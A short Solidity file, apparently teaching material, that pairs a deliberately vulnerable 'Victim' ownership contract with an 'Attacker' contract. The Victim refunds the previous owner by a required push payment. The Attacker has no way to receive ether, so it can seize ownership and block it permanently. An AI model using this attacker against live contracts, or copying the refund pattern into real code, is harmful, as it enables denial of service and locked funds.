// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.1;

contract Victim {
    address public owner;
    uint public balance;

    function becomeOwner() external payable {
        require(msg.value > balance);
        (bool sent, ) = owner.call{value: balance}("");
        require(sent, "Send failed");

        balance = msg.value;
        owner = msg.sender;
    }
}

contract Attacker { // has no fallback function, hence can't recieve eth
    Victim victimCOntract;

    constructor(address _victim) {
        victimCOntract = Victim(_victim);
    }

    function attack() external payable {
        victimCOntract.becomeOwner{value: msg.value}();
    }
}
